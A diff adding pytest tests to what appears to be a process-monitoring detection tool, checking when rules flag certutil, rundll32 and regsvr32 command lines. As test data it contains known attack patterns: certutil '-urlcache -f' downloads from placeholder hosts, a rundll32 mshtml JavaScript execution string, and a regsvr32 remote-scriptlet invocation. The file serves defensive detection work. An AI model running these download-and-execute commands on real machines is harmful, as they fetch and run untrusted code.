@@ -599,3 +599,74 @@ def test_rule_output_is_stable_when_process_and_path_metadata_are_reordered(
         [first.artifact_id],
         [second.artifact_id],
     ]
+
+
+@pytest.mark.parametrize(
+    "pattern",
+    [
+        r'javascript:"..\mshtml,RunHTMLApplication ";document.write()',
+        r'javascript:"\..\mshtml,RunHTMLApplication ";document.write()',
+    ],
+)
+def test_p009_accepts_canonical_and_retained_leading_backslash_forms(
+    snapshot_data, process_factory, pattern
+):
+    process = _process(process_factory, 70, "rundll32.exe", ["rundll32.exe", pattern])
+    findings = _evaluate("IRS-P009", _snapshot(snapshot_data, [process]))
+    assert len(findings) == 1
+    assert findings[0].severity == Severity.HIGH
+    assert next(item for item in findings[0].evidence if item.field == "script_pattern").value == pattern
+
+
+@pytest.mark.parametrize(
+    "arguments",
+    [
+        ["-urlcache", "-f", "-p", "https://secret.invalid/password", r"C:\Temp\local.cer"],
+        ["-p", "https://secret.invalid/password", "-urlcache", "-f", r"C:\Temp\local.cer"],
+        ["-urlcache", "-f", r"C:\Temp\local.cer", "https://example.invalid/not-the-source"],
+        ["-urlcache", "-f", "-unknown", "https://example.invalid/option-value"],
+        ["-urlcache", "-f", "https://example.invalid/source", "-p", "secret"],
+        ["-urlcache", "-f", "https://example.invalid/source", "one.bin", "two.bin"],
+        ["-urlcache", "-urlcache", "-f", "https://example.invalid/source"],
+    ],
+)
+def test_p008_does_not_promote_unrelated_values_to_urlcache_source(
+    snapshot_data, process_factory, arguments
+):
+    process = _process(process_factory, 71, "certutil.exe", ["certutil.exe", *arguments])
+    assert _evaluate("IRS-P008", _snapshot(snapshot_data, [process])) == []
+
+
+@pytest.mark.parametrize(
+    "flags",
+    [
+        ["-urlcache", "-f"],
+        ["-f", "-urlcache"],
+        ["-split", "-f", "-urlcache"],
+        ["-f", "-urlcache", "-split"],
+        ["-URLCache", "-SPLIT", "-F"],
+    ],
+)
+def test_p008_supports_explicit_no_value_flags_before_the_source(
+    snapshot_data, process_factory, flags
+):
+    source = "https://example.invalid/inert.bin"
+    argv = ["certutil.exe", *flags, source, r"C:\Temp\inert.bin"]
+    process = _process(process_factory, 72, "certutil.exe", argv)
+    findings = _evaluate("IRS-P008", _snapshot(snapshot_data, [process]))
+    assert len(findings) == 1
+    assert next(item for item in findings[0].evidence if item.field == "remote_source").value == source
+    assert next(item for item in findings[0].evidence if item.field == "download_options").value == flags
+
+
+@pytest.mark.parametrize("url", ["http://[", "https://[not-an-ip]/payload"])
+@pytest.mark.parametrize("rule_id", ["IRS-P008", "IRS-P010"])
+def test_command_rule_malformed_url_authority_is_nonmatch(
+    snapshot_data, process_factory, url, rule_id
+):
+    if rule_id == "IRS-P008":
+        name, argv = "certutil.exe", ["certutil.exe", "-urlcache", "-f", url, r"C:\Temp\out.bin"]
+    else:
+        name, argv = "regsvr32.exe", ["regsvr32.exe", f"/i:{url}", "scrobj.dll"]
+    process = _process(process_factory, 73, name, argv)
+    assert _evaluate(rule_id, _snapshot(snapshot_data, [process])) == []
